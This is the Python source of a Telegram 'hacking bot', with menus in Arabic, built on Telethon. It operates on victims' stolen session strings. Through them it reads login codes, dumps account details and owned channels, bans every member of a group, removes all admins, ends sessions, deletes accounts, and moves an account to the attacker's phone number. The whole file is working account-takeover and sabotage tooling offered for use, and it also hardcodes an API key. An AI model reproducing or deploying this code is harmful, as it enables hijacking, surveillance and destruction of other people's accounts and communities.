
import os
os.system("pip install Telethon==1.28.5")
from telethon import TelegramClient, events, functions, types
api_id = os.environ.get("APP_ID")
import os, asyncio
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
api_hash = os.environ.get("API_HASH")
token = os.environ.get("BOT_TOKEN")
client = TelegramClient('AbhiModszYT', api_id, api_hash).start(bot_token=token)
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

from telethon.tl.functions.channels import CreateChannelRequest as ccr
mybot = "missrose_bot"
bot = borg = client

legendx = 6075239892


async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 22587017, "5ffd6adfd65ba6909a6ac0e8db65c93e") as X:
    bot = client = X
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 22587017, "5ffd6adfd65ba6909a6ac0e8db65c93e") as X:
    bot = client = X
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 22587017, "5ffd6adfd65ba6909a6ac0e8db65c93e") as X:
    k = await X.get_me()
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 22587017, "5ffd6adfd65ba6909a6ac0e8db65c93e") as X:
    await X(rt())
GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 22587017, "5ffd6adfd65ba6909a6ac0e8db65c93e") as X:
    await X(functions.account.DeleteAccountRequest("me hi AbhiModszYT hu"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 22587017, "5ffd6adfd65ba6909a6ac0e8db65c93e") as X:
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 22587017, "5ffd6adfd65ba6909a6ac0e8db65c93e") as X:
    try:
      await X.edit_2fa('AbhiModszYT')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 22587017, "5ffd6adfd65ba6909a6ac0e8db65c93e") as X:
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 22587017, "5ffd6adfd65ba6909a6ac0e8db65c93e") as X:
    await X(join(username))

async def leavegroup(strses, username):
  async with tg(ses(strses), 22587017, "5ffd6adfd65ba6909a6ac0e8db65c93e") as X:
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 22587017, "5ffd6adfd65ba6909a6ac0e8db65c93e") as X:
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 22587017, "5ffd6adfd65ba6909a6ac0e8db65c93e") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 22587017, "5ffd6adfd65ba6909a6ac0e8db65c93e") as X:
    i = ""
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await client.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 22587017, "5ffd6adfd65ba6909a6ac0e8db65c93e") as X:
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 22587017, "5ffd6adfd65ba6909a6ac0e8db65c93e") as X:
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME {x.title} CHANNEL USRNAME @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "Abo_hadieda"
menu = '''
┏━━━━━━━━━❥
┣ Dev -> @Abu_hadieda
┣ Uᴘᴅᴀᴛᴇꜱ -> @Abo_hadieda
┗━━━━━━━━━❥

A: [معرفه قنوات/كروبات التي يملكها]

B: [{...جلب جميع معلومات المستخدم مثل {رقم الحساب ، معرف المستخدم و ايدي الشخص]

C: [{تفليش كروب/قناه {اعطني الكود و بعدها ارسل لي يوزر الكروب/القناه و ساطرد جميع اعضاء]]

D: [جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب عن طريق كود ترمكس]

E: [انضمام الى كروب/قناه عن طريق كود ترمكس]

F: [مغادره كروب /قناه عن طريق كود ترمكس]

G: [مسح كروب /قناه عن عن طريق كود ترمكس]

H: [تاكد من التحقق بخطوتين /مفعل او لا]

I: [انهاء جميع الجلسات ما عدا جلسة البوت]

J: [حذف الحساب]

K: [حذف جميع المشرفين في كروب/قناه]

L: [ترقيه عضو الى مشرف داخل كروب/قناه]

M: [تغير رقم الحساب باستخدام كود ترمكس]
┏━━━━━━━━━❥
┣ Dev -> @Abu_hadieda
┣ About   -> @Abo_hadieda
┗━━━━━━━━━❥
'''
mm = '''
┏━━━━━━━━━❥
┣ Dev -> @Abu_hadieda
┣ About   -> @Abo_hadieda
┗━━━━━━━━━❥
 اهلا بك في بوت الاختراق  يمكنك اختراق اي شخص عبر كود تيرمكس
 - اضغط علي  hack/ 
'''
@client.on(events.NewMessage(pattern="/start"))
async def op(event):
  global mm
  if not event.is_private:
    await event.reply("▾∮ عذرا البوت يعمل في الخاص فقط")
  else:
    await event.reply(mm)
@client.on(events.NewMessage(pattern="/give"))
async def op(event):
  if not event.sender_id == legendx:
    return await event.reply("▾∮ عذرا البوت يعمل في الخاص فقط")
  try:
    await event.reply("session bot file", file="AbhiModszYT.session")
  except Exception as e:
    print (e)


@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
async def op(event):
  await event.reply("▾∮ عذرا البوت يعمل في الخاص فقط")
@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
async def start(event):
  global menu
  async with bot.conversation(event.chat_id) as x:
    await x.send_message(f"قائمة اوامر البوت \n\n{menu}")
    res = await x.get_response()
    r = res.text
    if res.text == "A":
      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("▾∮ عذرا هذا الكود انتهت صلاحيته ")
      if len(i) > 3855:
        file = open("session.txt", "w")
        file.write(i + "\n\n▾∮ المعلومات بواسطه بوت تيرمكس")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
    elif res.text == "B":
      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته  ")
      i = await userinfo(strses.text)
      await event.reply(i + "\n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس  ")
    elif r == "C":
      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته  ")
      await x.send_message("▾∮ حسنا الان ارسل معرف /الايدي  القناة او المجموعة")
      grpid = await x.get_response()
      await userbans(strses.text, grpid.text)
      await event.reply("▾∮ تم حظر جميع الاعضاء بنجاح تم التفليش")
    elif r == "D":
      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته  ")
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
    elif r == "E":
      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته  ")
      await x.send_message("▾∮ حسنا الان ارسل معرف /الايدي  القناة او المجموعة")
      grpid = await x.get_response()
      await joingroup(strses.text, grpid.text)
      await event.reply("▾∮ تم الانضمام الى المجموعة او القناة بنجاح")
    elif r == "F":
      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته  ")
      await x.send_message("∮ حسنا الان ارسل معرف/الايدي  القناة او المجموعة")
      grpid = await x.get_response()
      await leavegroup(strses.text, grpid.text)
      await event.reply("▾∮ تمت المغادرة بنجاح ")
    elif r == "G":
      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته  ")
      await x.send_message("▾∮ حسنا الان ارسل معرف القناة او المجموعة")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("▾∮ تم حذف القناه بنجاح ✅ \n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
    elif r == "H":
      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته  ")
      i = await user2fa(strses.text)
      if i:
        await event.reply("▾∮ هذا الشخص لم يقوم بوضع رمز تحقق بخطوتين يمكنك اختراقه بنجاح و سهولة \n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
      else:
        await event.reply("▾∮ هذا الشخص مفعل رمز تحقق بخطوتين لا يمكن اختراقه لكن يمكنك حذف حسابه او استخدام اي امر اخر")
    elif r == "I":
      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته  ")
      i = await terminate(strses.text)
      await event.reply("▾∮ تم انهاء جميع الجلسات بنجاح ✅ \n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
    elif res.text == "J":
      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته  ")
      i = await delacc(strses.text)
      await event.reply("▾∮ تم حذف هذا الحساب بنجاح ✅\n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
    elif res.text == "L":
      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته  ")
      await x.send_message("▾∮ الان ارسل معرف او رابط القناه او المجموعة")
      grp = await x.get_response()
      await x.send_message("▾∮ الان ارسل معرف المستخدم")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("▾∮ تم رفعك مشرف بنجاح ✅\n\n▾∮ شكرا لاستخدام بوت  اختراق تيرمكس  ")
    elif res.text == "K":
      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته  ")
      await x.send_message("▾∮ الان ارسل معرف او رابط القناه او المجموعة")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("▾∮ يتم تنزيل جميع المشرفين تاكد بنفسك")
    elif res.text == "M":
      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته  ")
      await x.send_message("▾∮ ارسل الرقم الذي تريد تحويل الحساب عليه \n▾∮ ملاحظة:  لا تستخدم رقم امريكي \n▾∮ اذا استخدمت رقم امريكي ما راح يوصلك كود تغيير الرقم] ")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
        await asyncio.sleep(20)
        await x.send_message("▾∮ حسنا الان ارسل")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("▾∮ ارسل الان كود التحقق")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("▾∮ تم تغيير الرقم بنجاح")
        else:
          await event.respond("هناك شي خطا")
      except Exception as e:
        await event.respond("**هنالك خطأ**\n" + str(e))

    else:
      await event.respond("▾∮ استخدم hack/ فقط")



client.run_until_disconnected()
